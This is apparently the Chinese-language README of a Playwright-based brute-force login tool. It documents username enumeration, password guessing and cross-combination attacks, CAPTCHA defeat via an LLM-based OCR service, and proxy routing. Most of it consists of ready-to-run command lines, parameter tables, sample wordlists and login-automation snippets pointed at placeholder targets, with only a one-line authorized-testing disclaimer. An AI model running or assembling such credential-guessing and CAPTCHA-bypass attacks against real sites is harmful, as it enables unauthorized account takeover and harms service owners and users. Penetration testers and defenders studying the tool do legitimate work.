# 暴力破解登录脚本 v1.2

基于 Playwright 的自动化登录暴力破解工具，支持验证码识别（OCR）、代理功能、多种爆破模式和灵活的配置选项。

## 功能特性

- **多种爆破模式**：用户名枚举、密码爆破、交叉爆破
- **验证码支持**：
  - API模式：通过HTTP请求获取验证码
  - CSS选择器模式：通过页面截图获取验证码
  - 支持普通字符验证码和数学计算验证码
  - 支持从API响应中提取验证码（正则匹配）
- **代理支持**：
  - 浏览器代理（Playwright）：支持 HTTP 和 SOCKS5
  - 验证码/LLMOCR代理：独立配置，支持 HTTP 和 SOCKS5
- **灵活配置**：命令行参数、配置文件、代码片段
- **验证码错误统计**：记录验证码识别失败的凭据组合
- **Burp Suite兼容**：支持导入Burp Suite抓包格式的API配置

## 文件说明

```
.
├── brute-force-login.py              # 基础版本（无验证码支持）
├── brute-force-login-v1.1.py         # 验证码支持版本
├── brute-force-login-v1.2.py         # 验证码+代理支持版本（推荐）
├── LLMocr_class.py                   # OCR识别类（大模型SDK）
├── README.md                         # 本说明文档
├── usernames.txt                     # 用户名列表（示例）
├── passwords.txt                     # 密码列表（示例）
├── code.txt                          # 登录操作代码（示例）
├── captcha_api_config_example.txt    # Burp格式API配置示例
└── captcha_api_config_example.json   # JSON格式API配置示例
```

## 安装依赖

```bash
pip install playwright requests pysocks
playwright install chromium
```

## 快速开始

### 1. 准备用户名字典

创建 `usernames.txt`：
```
admin
root
test
guest
```

### 2. 准备密码字典

创建 `passwords.txt`：
```
123456
admin123
password
12345678
```

### 3. 准备登录代码

**⚠️ 重要：变量不要加引号！**

创建 `code.txt`，包含Playwright操作代码：
```python
page.goto("http://target.com/login")
page.get_by_label("用户名").fill(username)
page.get_by_label("密码").fill(password)
page.get_by_role("button", name="登录").click()
```

### 4. 运行脚本

#### 基础模式（无验证码）

```bash
python brute-force-login-v1.2.py --mode UnameEnum
```

#### 验证码模式 - API方式

```bash
python brute-force-login-v1.2.py --mode cross --use-captcha \
    --captcha-api-url "http://target.com/api/captcha" \
    --captcha-type normal --captcha-digits 4
```

#### 验证码模式 - CSS选择器方式

```bash
python brute-force-login-v1.2.py --mode PwBlute --use-captcha \
    --captcha-selector "img#captcha-img" \
    --captcha-selector-url "http://target.com/login" \
    --captcha-type math --captcha-digits 6
```

#### 使用代理

```bash
python brute-force-login-v1.2.py --mode cross \
    --proxy http://127.0.0.1:8080 \
    --captcha-proxy 127.0.0.1:1080 \
    --captcha-proxy-type socks5
```

## 命令行参数

### 基础参数

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `--headless` | flag | False | 无头模式运行浏览器 |
| `--mode` | str | UnameEnum | 爆破模式：UnameEnum/PwBlute/cross |
| `--username-file` | str | usernames.txt | 用户名字典文件路径 |
| `--password-file` | str | passwords.txt | 密码字典文件路径 |
| `--code-file` | str | code.txt | 登录代码文件路径 |
| `--code` | str | None | 直接传入登录代码（覆盖code-file） |
| `--common-password` | str | 123456 | 用户名枚举时使用的默认密码 |

### 结果匹配参数

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `--success-pattern` | str | (logout failed) | 登录成功匹配正则 |
| `--credentials-pattern` | str | (用户名或密码错误) | 用户名密码错误匹配正则 |
| `--captcha-pattern` | str | (验证码错误) | 验证码错误匹配正则 |
| `--other-pattern` | str | (系统错误\|服务器错误) | 其他错误匹配正则 |

### 验证码参数

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `--use-captcha` | flag | False | **启用验证码识别（必须添加此标志）** |
| `--captcha-selector` | str | img[alt="验证码"] | 验证码图片CSS选择器 |
| `--captcha-selector-url` | str | None | CSS选择器模式：获取验证码的页面URL |
| `--captcha-type` | str | math | 验证码类型：normal（普通字符）/ math（数学计算） |
| `--captcha-digits` | int | 6 | 验证码位数 |
| `--captcha-api-url` | str | None | API模式：验证码API地址 |
| `--captcha-api-config` | str | None | API配置文件路径（Burp格式或JSON） |
| `--captcha-response-regex` | str | None | 从API响应中提取验证码的正则表达式 |

### 代理参数

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `--proxy` | str | None | 浏览器代理（Playwright），格式：`http://host:port` 或 `socks5://host:port` |
| `--captcha-proxy` | str | None | 验证码API和LLMOCR请求的代理，格式：`host:port` |
| `--captcha-proxy-type` | str | http | 验证码代理类型：`http` 或 `socks5` |

## 爆破模式说明

### UnameEnum（用户名枚举）

使用固定密码尝试多个用户名，适用于发现有效用户名。

```bash
python brute-force-login-v1.2.py --mode UnameEnum \
    --username-file users.txt \
    --common-password "admin123" \
    --use-captcha \
    --captcha-api-url "http://target.com/captcha"
```

### PwBlute（密码爆破）

使用固定用户名尝试多个密码，适用于已知用户名的情况。

```bash
python brute-force-login-v1.2.py --mode PwBlute \
    --password-file passwords.txt \
    --use-captcha \
    --captcha-selector "img.captcha" \
    --captcha-selector-url "http://target.com/login"
```

### Cross（交叉爆破）

尝试所有用户名和密码的组合，最全面但耗时最长。

```bash
python brute-force-login-v1.2.py --mode cross \
    --username-file users.txt \
    --password-file passwords.txt \
    --use-captcha \
    --captcha-api-url "http://target.com/api/captcha" \
    --captcha-api-config "captcha_config.txt"
```

## 验证码配置

### 方式一：API模式

通过HTTP请求获取验证码图片或文本。

#### 简单GET请求

```bash
python brute-force-login-v1.2.py --use-captcha \
    --captcha-api-url "http://target.com/captcha.jpg"
```

#### POST请求（使用配置文件）

创建 `captcha_config.txt`（Burp Suite格式）：
```http
POST /api/captcha HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=abc123

{"type": "captcha", "size": 4}
```

运行：
```bash
python brute-force-login-v1.2.py --use-captcha \
    --captcha-api-url "http://target.com/api/captcha" \
    --captcha-api-config "captcha_config.txt"
```

#### 从响应中提取验证码（文本验证码）

```bash
python brute-force-login-v1.2.py --use-captcha \
    --captcha-api-url "http://target.com/api/captcha" \
    --captcha-api-config "captcha_config.txt" \
    --captcha-response-regex '"code":"(\w+)"'
```

#### 从响应中提取Base64图片

```bash
python brute-force-login-v1.2.py --use-captcha \
    --captcha-api-url "http://target.com/api/captcha" \
    --captcha-response-regex 'data:image/png;base64,([A-Za-z0-9+/=]+)' \
    --captcha-type normal --captcha-digits 4
```

### 方式二：CSS选择器模式

通过页面截图获取验证码图片。

```bash
python brute-force-login-v1.2.py --use-captcha \
    --captcha-selector "img#captcha-image" \
    --captcha-selector-url "http://target.com/login" \
    --captcha-type math --captcha-digits 6
```

**流程说明**：
1. 导航到 `--captcha-selector-url` 指定的页面
2. 使用CSS选择器定位验证码图片元素
3. 截图并通过OCR识别
4. 执行登录操作（不刷新页面）

## 代理配置

### 浏览器代理

浏览器代理会影响所有Playwright操作：

```bash
# HTTP代理
python brute-force-login-v1.2.py --mode cross --proxy http://127.0.0.1:8080

# SOCKS5代理
python brute-force-login-v1.2.py --mode cross --proxy socks5://127.0.0.1:1080

# 带认证的代理
python brute-force-login-v1.2.py --mode cross --proxy socks5://user:pass@127.0.0.1:1080
```

### 验证码/LLMOCR代理

独立的代理配置，用于验证码API请求和LLMOCR识别：

```bash
python brute-force-login-v1.2.py --mode cross --use-captcha \
    --captcha-proxy 127.0.0.1:1080 \
    --captcha-proxy-type socks5 \
    --captcha-api-url "http://target.com/captcha"
```

## API配置文件格式

### Burp Suite格式（推荐）

直接从Burp Suite复制原始请求：
```http
POST /api/captcha HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
Cookie: session=abc123
Content-Length: 26

{"type": "captcha", "size": 4}
```

### JSON格式

```json
{
  "method": "POST",
  "headers": {
    "Content-Type": "application/json",
    "Authorization": "Bearer token123"
  },
  "json": {
    "action": "get_captcha",
    "type": "math"
  }
}
```

## OCR配置

`LLMocr_class.py` 使用大模型API进行验证码识别，支持两种类型：

### Normal模式（普通字符验证码）

识别数字和字母组合：
```bash
--captcha-type normal --captcha-digits 4
```

### Math模式（数学计算验证码）

识别并计算数学表达式（如 "3+5="）：
```bash
--captcha-type math --captcha-digits 6
```

## 登录代码编写指南

### ⚠️ 重要提示：变量使用规则

`code.txt` 中的代码会在每次尝试时执行，脚本会自动传入以下变量：

| 变量名 | 说明 | 示例值 |
|--------|------|--------|
| `page` | Playwright页面对象 | Page对象 |
| `username` | 当前尝试的用户名 | `"admin"` |
| `password` | 当前尝试的密码 | `"123456"` |
| `captcha_code` | 识别到的验证码（仅使用验证码时可用） | `"8372"` |

### ❌ 错误写法

**变量名加引号会导致填充字符串字面量！**

```python
# ❌ 错误：这样会填充字符串 "username" 而不是实际的用户名
page.get_by_placeholder("用户名").fill("username")
page.get_by_placeholder("密码").fill("password")
page.get_by_placeholder("验证码").fill("captcha_code")
```

### ✅ 正确写法

**变量名不要加引号！**

```python
# ✅ 正确：使用变量引用，会自动替换为实际值
page.get_by_placeholder("用户名").fill(username)
page.get_by_placeholder("密码").fill(password)
page.get_by_placeholder("验证码").fill(captcha_code)
```

### 完整示例代码

```python
# 基础登录
page.goto("http://target.com/login")
page.fill("#username", username)
page.fill("#password", password)
page.click("#login-btn")

# 带验证码的登录（CSS选择器模式，移除goto避免刷新）
# page.goto("http://target.com/login")  # CSS选择器模式时注释掉这行！
page.fill("#username", username)
page.fill("#password", password)
page.fill("#captcha", captcha_code)
page.click("#login-btn")

# 使用Playwright的定位器
page.get_by_label("用户名").fill(username)
page.get_by_label("密码").fill(password)
page.get_by_label("验证码").fill(captcha_code)
page.get_by_role("button", name="登录").click()
```

### 常见问题排查

如果发现用户名/密码没有被替换，请检查：

1. ❓ 变量名是否加了引号？
   - `fill("username")` ❌ → `fill(username)` ✅
   
2. ❓ 变量名拼写是否正确？
   - `usernme` ❌ → `username` ✅
   - `passwd` ❌ → `password` ✅
   
3. ❓ 是否启用了验证码但代码中使用了 `captcha_code`？
   - 未启用 `--use-captcha` 时，`captcha_code` 为 `None`

## 完整使用示例

### 示例1：基础用户名枚举

```bash
python brute-force-login-v1.2.py \
    --mode UnameEnum \
    --username-file users.txt \
    --common-password "password123" \
    --success-pattern "(欢迎|首页|dashboard)" \
    --credentials-pattern "(用户名或密码错误|login failed)"
```

### 示例2：带验证码的密码爆破（API模式）

```bash
python brute-force-login-v1.2.py \
    --headless \
    --mode PwBlute \
    --password-file passwords.txt \
    --code-file login_code.txt \
    --use-captcha \
    --captcha-api-url "http://192.168.1.100:8080/captcha" \
    --captcha-api-config "captcha_config.json" \
    --captcha-type normal \
    --captcha-digits 4 \
    --success-pattern "(登录成功|welcome)" \
    --captcha-pattern "(验证码错误|captcha error)"
```

### 示例3：带验证码的交叉爆破（CSS选择器模式）

```bash
python brute-force-login-v1.2.py \
    --headless \
    --mode cross \
    --username-file users.txt \
    --password-file passwords.txt \
    --code-file login_code.txt \
    --use-captcha \
    --captcha-selector "img.captcha-img" \
    --captcha-selector-url "http://target.com/login" \
    --captcha-type math \
    --captcha-digits 6 \
    --success-pattern "(dashboard|首页)" \
    --credentials-pattern "(用户名或密码错误)" \
    --captcha-pattern "(验证码错误)"
```

### 示例4：使用代理的完整配置

```bash
python brute-force-login-v1.2.py \
    --headless \
    --mode cross \
    --username-file users.txt \
    --password-file passwords.txt \
    --use-captcha \
    --captcha-api-url "http://target.com/api/captcha" \
    --captcha-type normal \
    --captcha-digits 4 \
    --proxy http://127.0.0.1:8080 \
    --captcha-proxy 127.0.0.1:1080 \
    --captcha-proxy-type socks5
```

## 注意事项

1. **变量不加引号**：`code.txt` 中的 `username`、`password`、`captcha_code` 是变量，不要加引号！

2. **验证码刷新问题**：使用CSS选择器模式时，确保 `code.txt` 中的登录代码不包含 `page.goto()`，否则会导致验证码刷新。

3. **验证码错误统计**：爆破结束后会统计验证码错误的凭据组合，帮助分析OCR识别准确率。

4. **成功暂停**：发现有效凭据时会暂停，按回车继续或Ctrl+C停止。

5. **无头模式**：使用 `--headless` 可以在后台运行，但不便于调试。

6. **正则表达式**：结果匹配使用Python正则，注意转义特殊字符。

7. **OCR依赖**：`LLMocr_class.py` 需要配置大模型API密钥，请根据实际情况修改。

## 故障排除

### 用户名/密码没有被替换

**最常见原因：变量名加了引号！**

```python
# ❌ 错误
page.fill("#username", "username")

# ✅ 正确
page.fill("#username", username)
```

### 验证码一直识别失败

- 检查 `--captcha-type` 是否正确（normal/math）
- 检查 `--captcha-digits` 是否匹配实际位数
- 检查验证码图片是否能正常获取（尝试非无头模式查看）
- 检查登录代码是否包含 `page.goto()` 导致验证码刷新

### API请求失败

- 检查 `--captcha-api-url` 是否正确
- 检查 `--captcha-api-config` 文件格式是否正确
- 使用Burp Suite格式时确保包含完整的HTTP请求头

### 登录结果判断错误

- 调整 `--success-pattern` 和错误模式正则表达式
- 在非无头模式下观察页面实际返回内容
- 检查页面加载是否完成（适当添加sleep）

### 代理连接失败

- 检查代理服务器是否正常运行
- 检查代理地址和端口是否正确
- SOCKS5代理需要安装 `pysocks` 库

## 安全声明

本工具仅供安全测试和学习研究使用，请勿用于非法用途。使用本工具进行未授权访问可能违反法律法规。

## 更新日志

### v1.2
- 新增代理功能：支持HTTP和SOCKS5代理
- 浏览器代理和验证码/LLMOCR代理独立配置
- 优化验证码错误统计功能
- 修复 `exec()` 变量传递问题

### v1.1
- 新增验证码支持（API模式和CSS选择器模式）
- 新增OCR识别（支持普通字符和数学计算）
- 新增Burp Suite格式配置文件支持
- 新增验证码错误统计功能

### v1.0
- 基础暴力破解功能
- 支持三种爆破模式
- 命令行参数配置
- Playwright自动化操作
